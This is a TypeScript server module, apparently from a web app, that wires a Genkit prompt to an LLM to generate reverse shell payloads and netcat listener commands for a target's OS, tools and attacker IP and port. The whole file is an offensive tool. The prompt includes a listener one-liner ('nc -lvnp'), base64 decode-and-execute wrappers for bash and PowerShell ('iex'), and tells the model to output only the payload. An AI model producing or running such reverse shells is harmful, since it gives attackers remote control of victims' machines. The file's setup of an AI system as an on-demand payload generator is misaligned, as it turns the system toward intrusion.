'use server';

/**
 * @fileOverview Reverse shell script and listener generation based on environment details.
 *
 * - generateReverseShellFromEnvironment - A function to generate reverse shell scripts and listeners.
 * - ReverseShellInput - Input type for environment details.
 * - ReverseShellOutput - Return type for the generated script and listener.
 */

import {ai} from '@/ai/genkit';
import {z} from 'genkit';

const ReverseShellInputSchema = z.object({
  os: z.string().describe('Operating system of the target (e.g., Linux, Windows).'),
  architecture: z.string().describe('Target architecture (e.g., x86, x64, ARM).'),
  availableTools: z
    .string()
    .describe('Available tools on the target (e.g., netcat, bash, python).'),
  scriptingLanguage: z
    .string()
    .describe('Desired scripting language for the reverse shell (e.g., bash, python, powershell).'),
  targetIp: z.string().describe('The IP address of the attacking machine.'),
  targetPort: z.string().describe('The port on the attacking machine to connect to.'),
  encoding: z.enum(['none', 'base64']).describe('The desired payload encoding.'),
});
export type ReverseShellInput = z.infer<typeof ReverseShellInputSchema>;

const ReverseShellOutputSchema = z.object({
  script: z.string().describe('The generated reverse shell script, possibly encoded.'),
  listenerScript: z.string().describe('The command to start a listener on the attacker machine.'),
});
export type ReverseShellOutput = z.infer<typeof ReverseShellOutputSchema>;

export async function generateReverseShellFromEnvironment(
  input: ReverseShellInput
): Promise<ReverseShellOutput> {
  return generateReverseShellFlow(input);
}

const reverseShellPrompt = ai.definePrompt({
  name: 'reverseShellPrompt',
  input: {schema: ReverseShellInputSchema},
  output: {schema: ReverseShellOutputSchema},
  prompt: `You are an expert in generating reverse shell scripts and corresponding listener commands.

  ENVIRONMENT:
  - Operating System: {{{os}}}
  - Architecture: {{{architecture}}}
  - Available Tools: {{{availableTools}}}
  - Scripting Language: {{{scriptingLanguage}}}
  - Attacker IP: {{{targetIp}}}
  - Attacker Port: {{{targetPort}}}
  - Encoding: {{{encoding}}}

  INSTRUCTIONS:
  1.  **Generate Listener Script**: First, create the command to start a listener on the attacker machine. A simple netcat listener using 'nc -lvnp {{{targetPort}}}' is sufficient.
  2.  **Generate Payload Script**: Second, create the raw, unencoded reverse shell payload script based on the environment details.
  3.  **Encode Payload (if required)**: If '{{{encoding}}}' is 'base64', take the raw script from step 2, encode it in Base64, and then wrap it in a command that will decode and execute it on the target machine. For bash, use 'echo "BASE64_STRING" | base64 -d | bash'. For PowerShell, use '$c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING")); iex $c'.
  4.  **Final Script**: The 'script' field in your output should be the result from step 3 if encoding was used, otherwise it should be the raw script from step 2.

  Provide only the final payload script and the listener script in the specified JSON format, without any additional explanations or formatting.
  `,
});

const generateReverseShellFlow = ai.defineFlow(
  {
    name: 'generateReverseShellFlow',
    inputSchema: ReverseShellInputSchema,
    outputSchema: ReverseShellOutputSchema,
  },
  async input => {
    const {output} = await reverseShellPrompt(input);
    return output!;
  }
);
